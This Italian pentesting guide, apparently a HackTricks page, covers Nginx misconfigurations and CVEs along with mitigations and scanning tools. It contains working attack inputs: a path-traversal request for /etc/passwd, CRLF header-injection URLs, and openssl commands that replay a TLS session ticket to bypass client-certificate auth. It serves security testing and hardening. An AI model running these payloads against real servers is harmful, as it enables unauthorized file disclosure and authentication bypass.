# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Posizione root mancante <a href="#missing-root-location" id="missing-root-location"></a>

Quando si configura il server Nginx, la **root directive** svolge un ruolo critico definendo la directory base da cui vengono serviti i file. Considera l'esempio seguente:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
In questa configurazione, `/etc/nginx` è designata come directory root. Questa impostazione permette l'accesso ai file all'interno della directory root specificata, come `/hello.txt`. Tuttavia, è fondamentale notare che è definita solo una location specifica (`/hello.txt`). Non esiste una configurazione per la location root (`location / {...}`). Questa omissione significa che la direttiva root si applica globalmente, consentendo alle richieste al path root `/` di accedere ai file sotto `/etc/nginx`.

Una considerazione di sicurezza critica deriva da questa configurazione. Una semplice richiesta `GET`, come `GET /nginx.conf`, potrebbe esporre informazioni sensibili servendo il file di configurazione di Nginx situato in `/etc/nginx/nginx.conf`. Impostare il root su una directory meno sensibile, come `/etc`, potrebbe mitigare questo rischio; tuttavia potrebbe comunque consentire l'accesso non intenzionale ad altri file critici, inclusi altri file di configurazione, i log di accesso e persino credenziali cifrate usate per l'autenticazione HTTP Basic.

## Misconfigurazione Alias LFI <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Nei file di configurazione di Nginx, è necessaria un'attenta ispezione delle direttive "location". Una vulnerabilità nota come Local File Inclusion (LFI) può essere introdotta involontariamente tramite una configurazione che assomiglia alla seguente:
```
location /imgs {
alias /path/images/;
}
```
Questa configurazione è vulnerabile a LFI attacks perché il server interpreta richieste come `/imgs../flag.txt` come un tentativo di accedere a file al di fuori della directory prevista, risolvendo effettivamente in `/path/images/../flag.txt`. Questa falla permette agli attacker di recuperare file dal filesystem del server che non dovrebbero essere accessibili via web.

Per mitigare questa vulnerabilità, la configurazione dovrebbe essere modificata in modo da:
```
location /imgs/ {
alias /path/images/;
}
```
Maggiori informazioni: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Test di Accunetix:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Restrizione del percorso non sicura <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Consulta la pagina seguente per imparare come effettuare un bypass di direttive come:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Uso insicuro di variabili / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Le variabili `$uri` e `$document_ur`i sono vulnerabili; si può risolvere sostituendole con `$request_uri`.
>
> Una regex può anche essere vulnerabile come:
>
> `location ~ /docs/([^/])? { … $1 … }` - Vulnerable
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Not vulnerable (checking spaces)
>
> `location ~ /docs/(.*)? { … $1 … }` - Not vulnerable

Una vulnerabilità nella configurazione di Nginx è illustrata dall'esempio seguente:
```
location / {
return 302 https://example.com$uri;
}
```
I caratteri \r (Carriage Return) e \n (Line Feed) indicano caratteri di nuova riga nelle richieste HTTP, e le loro forme URL-encoded sono rappresentate come `%0d%0a`. Includere questi caratteri in una richiesta (ad esempio, `http://localhost/%0d%0aDetectify:%20clrf`) a un server mal configurato fa sì che il server emetta un nuovo header chiamato `Detectify`. Questo accade perché la variabile $uri decodifica i caratteri di nuova riga URL-encoded, portando a un header inaspettato nella risposta:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Scopri di più sui rischi di CRLF injection e response splitting su [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Questa tecnica è [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) con alcuni esempi vulnerabili e meccanismi di rilevamento. Ad esempio, per rilevare questa errata configurazione da una prospettiva blackbox potresti inviare queste richieste:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Se vulnerabile, la prima restituirà perché "X" è qualsiasi metodo HTTP e la seconda restituirà un errore poiché H non è un metodo valido. Quindi il server riceverà qualcosa come: `GET / H HTTP/1.1` e questo innescherà l'errore.

Altri esempi di rilevamento sarebbero:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Alcune configurazioni vulnerabili trovate e presentate in quel talk erano:

- Note how **`$uri`** is set as is in the final URL
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Nota come ancora **`$uri`** sia nell'URL (questa volta all'interno di un parametro)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Ora in AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Qualsiasi variabile

È stato scoperto che **dati forniti dall'utente** potrebbero essere trattati come una **variabile Nginx** in determinate circostanze. La causa di questo comportamento rimane in parte sfuggente, tuttavia non è né rara né semplice da verificare. Questa anomalia è stata evidenziata in un report di sicurezza su HackerOne, che può essere visualizzato [here](https://hackerone.com/reports/370094). Ulteriori indagini sul messaggio d'errore hanno portato all'identificazione della sua occorrenza all'interno del [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), individuando Server Side Includes (SSI) come causa principale.

Per **rilevare questa misconfigurazione**, è possibile eseguire il seguente comando, che imposta un referer header per testare la stampa delle variabili:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Le scansioni per questa misconfigurazione su più sistemi hanno rivelato molteplici istanze in cui variabili di Nginx potevano essere visualizzate da un utente. Tuttavia, una diminuzione del numero di istanze vulnerabili suggerisce che gli sforzi per correggere il problema sono stati in parte efficaci.

### Uso di try_files con variabili $URI$ARGS

La seguente misconfigurazione di Nginx può portare a una vulnerabilità LFI:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
Nella nostra configurazione abbiamo la direttiva `try_files` che viene usata per verificare l'esistenza di file in un ordine specificato. Nginx servirà il primo che trova. La sintassi base della direttiva `try_files` è la seguente:
```
try_files file1 file2 ... fileN fallback;
```
Nginx controllerà l'esistenza di ogni file nell'ordine specificato. Se un file esiste, verrà servito immediatamente. Se nessuno dei file specificati esiste, la richiesta verrà inoltrata all'opzione di fallback, che può essere un altro URI o una pagina di errore specifica.

Tuttavia, quando si usano le variabili `$uri$args` in questa direttiva, Nginx cercherà un file che corrisponda all'URI della richiesta combinato con eventuali parametri della query string. Pertanto possiamo sfruttare questa configurazione:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Con il seguente payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Usando il nostro payload usciremo dalla directory root (definita nella configurazione di Nginx) e caricheremo il file `/etc/passwd`. Nei log di debug possiamo osservare come Nginx prova i file:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC contro Nginx usando la configurazione menzionata sopra:
![Esempio di richiesta burp](../../images/nginx_try_files.png)

## Lettura della risposta grezza del backend

Nginx offre una funzionalità tramite `proxy_pass` che permette l'intercettazione di errori e header HTTP prodotti dal backend, con l'obiettivo di nascondere messaggi di errore interni e header. Questo viene realizzato da Nginx servendo pagine di errore personalizzate in risposta agli errori del backend. Tuttavia, sorgono problemi quando Nginx riceve una richiesta HTTP non valida. Tale richiesta viene inoltrata al backend così com'è, e la risposta grezza del backend viene quindi inviata direttamente al client senza l'intervento di Nginx.

Considera uno scenario di esempio che coinvolge un'applicazione uWSGI:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Per gestire questo, vengono utilizzate direttive specifiche nella configurazione di Nginx:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Questa direttiva permette a Nginx di fornire una risposta personalizzata per le risposte del backend con un codice di stato maggiore di 300. Ciò garantisce che, per la nostra applicazione uWSGI di esempio, una risposta `500 Error` venga intercettata e gestita da Nginx.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Come suggerisce il nome, questa direttiva nasconde specifici header HTTP al client, aumentando privacy e sicurezza.

Quando viene effettuata una richiesta `GET` valida, Nginx la elabora normalmente, restituendo una risposta d'errore standard senza rivelare header segreti. Tuttavia, una richiesta HTTP non valida bypassa questo meccanismo, comportando l'esposizione delle risposte grezze del backend, inclusi header segreti e messaggi di errore.

## merge_slashes set to off

Per default, la **direttiva `merge_slashes`** di Nginx è impostata su **`on`**, il che comprime più slash consecutivi in un URL in un singolo slash. Questa funzionalità, pur semplificando l'elaborazione degli URL, può involontariamente nascondere vulnerabilità nelle applicazioni dietro Nginx, in particolare quelle suscettibili a local file inclusion (LFI). Gli esperti di sicurezza **Danny Robinson and Rotem Bar** hanno evidenziato i rischi potenziali associati a questo comportamento predefinito, specialmente quando Nginx agisce come reverse-proxy.

Per mitigare tali rischi, è consigliabile **disattivare la direttiva `merge_slashes`** per applicazioni vulnerabili a questi problemi. Questo garantisce che Nginx inoltri le richieste all'applicazione senza alterare la struttura dell'URL, evitando così di mascherare eventuali problemi di sicurezza sottostanti.

Per maggiori informazioni consulta [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Response Headers**

Come mostrato in [**this writeup**](https://mizu.re/post/cors-playground), ci sono alcuni header che, se presenti nella risposta del web server, modificano il comportamento del proxy Nginx. Puoi consultarli [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Indica a Nginx di reindirizzare internamente una richiesta verso una posizione specificata.
- `X-Accel-Buffering`: Controlla se Nginx deve bufferizzare la risposta o meno.
- `X-Accel-Charset`: Imposta il set di caratteri della risposta quando si usa X-Accel-Redirect.
- `X-Accel-Expires`: Imposta il tempo di scadenza della risposta quando si usa X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Limita la velocità di trasferimento delle risposte quando si usa X-Accel-Redirect.

Ad esempio, l'header **`X-Accel-Redirect`** causerà un **redirect** interno in nginx. Quindi avere una configurazione di nginx con qualcosa come **`root /`** e una risposta dal web server con **`X-Accel-Redirect: .env`** farà sì che nginx invii il contenuto di **`/.env`** (Path Traversal).

### **Default Value in Map Directive**

Nella **configurazione di Nginx**, la direttiva `map` spesso svolge un ruolo nel **controllo delle autorizzazioni**. Un errore comune è non specificare un valore **predefinito**, il che potrebbe portare ad accessi non autorizzati. Ad esempio:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Senza un `default`, un **utente maligno** può aggirare la sicurezza accedendo a un **URI non definito** all'interno di `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) consiglia di impostare un **valore di default** per evitare tali problemi.

### **DNS Spoofing Vulnerability**

Il DNS spoofing contro Nginx è possibile in certe condizioni. Se un attaccante conosce il **server DNS** usato da Nginx e può intercettare le sue query DNS, può falsificare i record DNS. Questo metodo, tuttavia, è inefficace se Nginx è configurato per usare **localhost (127.0.0.1)** per la risoluzione DNS. Nginx consente di specificare un server DNS come segue:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` e `internal` direttive**

La direttiva **`proxy_pass`** è utilizzata per reindirizzare le richieste verso altri server, sia internamente sia esternamente. La direttiva **`internal`** garantisce che alcune location siano accessibili solo dall'interno di Nginx. Pur non essendo vulnerabilità di per sé, la loro configurazione richiede un'accurata verifica per prevenire falle di sicurezza.

## proxy_set_header Upgrade & Connection

Se il server nginx è configurato per inoltrare gli header Upgrade e Connection, può essere effettuato un [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) per accedere a endpoint protetti/interni.

> [!CAUTION]
> Questa vulnerabilità permetterebbe a un attaccante di **stabilire una connessione diretta con l'endpoint `proxy_pass`** (`http://backend:9999` in questo caso) il cui contenuto non verrebbe controllato da nginx.

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Nota che anche se il `proxy_pass` puntava a uno specifico **percorso** come `http://backend:9999/socket.io` la connessione verrà stabilita con `http://backend:9999` quindi puoi **contattare qualsiasi altro percorso all'interno di quell'endpoint interno. Quindi non importa se è specificato un percorso nell'URL di proxy_pass.**

## HTTP/3 QUIC module remote DoS & leak (2024)

Durante il 2024 Nginx ha divulgato CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 e CVE-2024-35200 mostrando che una **singola sessione QUIC ostile** può crashare i processi worker o leakare memoria ogni volta che il modulo sperimentale `ngx_http_v3_module` è compilato e viene esposta una socket `listen ... quic`. Le build impattate sono 1.25.0–1.25.5 e 1.26.0, mentre 1.27.0/1.26.1 includono le fix; la memory disclosure (CVE-2024-34161) richiede inoltre MTU maggiori di 4096 byte per far emergere dati sensibili (dettagli nell'advisory nginx 2024 referenziato qui sotto).

**Recon & exploitation hints**

- HTTP/3 è opt-in, quindi scansiona per risposte `Alt-Svc: h3=":443"` o brute-force dei handshake QUIC su UDP/443; una volta confermato, fuzzare l'handshake e i frame STREAM con payload custom `quiche-client`/`nghttp3` per triggerare crash dei worker e forzare il leak dei log.
- Identifica rapidamente il supporto del target con:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## TLS session resumption bypass of client cert auth (CVE-2025-23419)

Un advisory di febbraio 2025 ha rivelato che nginx 1.11.4–1.27.3 compilato con OpenSSL consente **reusing a TLS 1.3 session** da un name-based virtual host all'interno di un altro, permettendo così a un client che ha negoziato con un host senza certificato di riprodurre il ticket/PSK per entrare in un vhost protetto con `ssl_verify_client on;` e bypassare completamente mTLS. Il bug si manifesta ogni volta che più virtual host condividono la stessa TLS 1.3 session cache e tickets (vedi l'advisory nginx 2025 referenziato sotto).

**Playbook dell'attaccante**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Se il target è vulnerabile, il secondo handshake si completa senza presentare un certificato client, rivelando posizioni protette.

**Cosa verificare**

- Blocchi `server_name` misti che condividono `ssl_session_cache shared:SSL` oltre a `ssl_session_tickets on;`.
- Blocchi Admin/API che si aspettano mTLS ma ereditano impostazioni condivise di session cache/ticket da host pubblici.
- Automazione che abilita TLS 1.3 session resumption globalmente (es., Ansible roles) senza considerare l'isolamento dei vhost.

## Resilienza a HTTP/2 Rapid Reset (comportamento CVE-2023-44487)

L'attacco HTTP/2 Rapid Reset (CVE-2023-44487) continua a influenzare nginx quando gli operatori aumentano `keepalive_requests` o `http2_max_concurrent_streams` oltre i valori di default: un attaccante apre una connessione HTTP/2, la inonda con migliaia di stream, poi invia immediatamente frame `RST_STREAM` in modo che il tetto di concorrenza non venga mai raggiunto mentre la CPU continua a consumarsi sulla logica di tear-down. I default di nginx (128 concurrent streams, 1000 keepalive requests) mantengono il raggio di impatto piccolo; aumentare quei limiti "sostanzialmente" rende banale affamare i worker anche da un singolo client (vedi il write-up di F5 referenziato sotto).

**Suggerimenti per il rilevamento**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Gli host che espongono valori insolitamente alti per queste direttive sono obiettivi ideali: un client HTTP/2 può ripetere la creazione di stream e inviare istantanei frame `RST_STREAM` per tenere la CPU al massimo senza superare il limite di concorrenza.

## Provalo tu stesso

Detectify ha creato un repository GitHub dove puoi usare Docker per configurare il tuo server di test Nginx vulnerabile con alcune delle misconfigurazioni discusse in questo articolo e provare a individuarle da solo!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Strumenti di analisi statica

### [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)

GixyNG (un fork aggiornato di GIXY) è uno strumento per analizzare le configurazioni Nginx, con l'obiettivo di individuare vulnerabilità, direttive insicure e misconfigurazioni rischiose. Trova anche misconfigurazioni che influenzano le prestazioni e rileva opportunità di hardening mancate, permettendo il rilevamento automatizzato delle falle.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner è uno strumento semplice per cercare misconfigurazioni e vulnerabilità comuni di Nginx.

## Riferimenti

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
